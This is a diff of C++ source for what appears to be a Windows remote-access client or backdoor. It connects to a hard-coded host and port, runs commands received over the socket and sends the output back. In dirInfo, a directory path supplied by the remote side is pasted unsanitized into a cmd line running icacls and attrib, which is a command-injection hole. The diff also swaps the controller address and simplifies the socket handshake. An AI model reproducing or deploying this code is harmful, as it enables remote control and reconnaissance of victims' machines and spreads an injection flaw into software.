@@ -10,8 +10,8 @@
 using namespace std;
 
 #define DEFAULT_BUFLEN 1050
-#define DEFAULT_PORT "5005"
-#define DEFAULT_HOST "192.168.43.49"
+#define DEFAULT_PORT "5006"
+#define DEFAULT_HOST "127.0.0.1"
 
 std::ofstream openFile(char *file_path)
 {
@@ -89,38 +89,20 @@ void executeCommand(SocketManager socketManager, SOCKET socket)
 
 void dirInfo(SocketManager socketManager, SOCKET socket)
 {
-	//get directory size
-	int iResult, iResult2;
-	char sizeOfPacket[DEFAULT_BUFLEN];
-	memset(sizeOfPacket, 0, DEFAULT_BUFLEN);
-	iResult = socketManager.receive(socket, sizeOfPacket, DEFAULT_BUFLEN);
-	iResult2 = socketManager.send_data(socket, "ok");//ok
-
+	int result;
+	char recvbuf[DEFAULT_BUFLEN * 4];
 	//get directory
-	int sizePacket = atoi(sizeOfPacket);
-	char *packet = new char[sizePacket + 1];
-	memset(packet, 0, sizePacket + 1);
-	iResult = socketManager.receive(socket, packet, sizePacket+1);
-	iResult2 = socketManager.send_data(socket, "ok");//ok
+	
+	result = socketManager.receive(socket, recvbuf, DEFAULT_BUFLEN *4); // TODO: what to do with result?
 
-	//char * command = "cd \"C:\\Users\\admin\\Desktop\\Analysis\" && for /f %x in ('dir /b') do icacls %x";
-	string dir = string(packet);
+	string dir = string(recvbuf);
 	string command = "cd \"" + dir + "\" && for /f %x in ('dir /b /a') do icacls %x && attrib %x";
 	
 	//executes the command
 	std::string w = exec(command.c_str());
 
-	//send size
-	iResult2 = socketManager.send_data(socket, to_string(w.length()).c_str());
-	char *packetOK = new char[3];
-	memset(packetOK, 0, 3);
-	iResult = socketManager.receive(socket, packetOK, 3);//ok
-
 	//send result
-	iResult2 = socketManager.send_data(socket, w.c_str());
-	memset(packetOK, 0, 3);
-	iResult = socketManager.receive(socket, packetOK, 3);//ok
-	
+	result = socketManager.send_data(socket, w.c_str());	
 }
 
 bool changeIp(SocketManager & socketManager, SOCKET & socket)
@@ -270,7 +252,6 @@ int main(int argc, char **argv)
 			{
 				char recvbuf[DEFAULT_BUFLEN * 4] = { 0 };
 				iResult = socketManager.receive(socket, recvbuf, recvbuflen * 4);
-				iResult2 = socketManager.send_data(socket, "ok");
 				if (iResult > 0)
 				{
 
